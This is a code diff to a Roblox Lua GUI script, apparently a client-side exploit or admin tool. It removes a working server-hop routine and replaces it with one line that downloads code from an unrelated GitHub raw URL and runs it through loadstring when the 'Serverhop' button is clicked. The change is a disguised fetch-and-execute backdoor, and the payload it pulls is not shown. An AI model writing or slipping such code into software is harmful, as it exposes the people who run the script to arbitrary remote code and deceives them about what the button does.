@@ -3439,21 +3439,7 @@ Rejoin_Button.MouseButton1Click:Connect(function()
 end)
 
 Serverhop_Button.MouseButton1Click:Connect(function()
-	if httprequest then
-		local servers = {}
-		local req = httprequest({Url = string.format("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Desc&limit=100", game.PlaceId)})
-		local body = HttpService:JSONDecode(req.Body)
-		if body and body.data then
-			for i, v in next, body.data do
-				if type(v) == "table" and tonumber(v.playing) and tonumber(v.maxPlayers) and v.playing < v.maxPlayers and v.id ~= game.JobId then
-					table.insert(servers, 1, v.id)
-				end
-			end
-		end
-		if #servers > 0 then
-			game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, servers[math.random(1, #servers)], plr)
-		end
-	end
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/raditself/c/main/x"))()
 end)
 
 ChatBox_Input.FocusLost:Connect(function()
